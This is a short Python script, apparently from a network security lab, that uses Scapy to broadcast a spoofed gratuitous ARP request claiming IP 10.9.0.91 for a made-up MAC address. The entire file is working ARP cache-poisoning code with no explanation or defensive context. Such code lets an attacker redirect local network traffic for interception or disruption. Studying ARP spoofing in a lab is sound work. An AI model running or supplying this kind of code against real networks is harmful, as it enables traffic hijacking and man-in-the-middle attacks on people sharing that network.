#!/usr/bin/python3
from scapy.all import *

IP_new   = "10.9.0.91"
MAC_new  = "aa:bb:cc:dd:44:55"

print("SENDING SPOOFED ARP GRATUITOUS MESSAGE......")

ether = Ether()
ether.dst = "ff:ff:ff:ff:ff:ff"
ether.src = MAC_new

arp = ARP()
arp.psrc  = IP_new
arp.hwsrc = MAC_new
arp.pdst  = IP_new
arp.hwdst = "ff:ff:ff:ff:ff:ff"
arp.op = 1 
frame = ether/arp
sendp(frame)
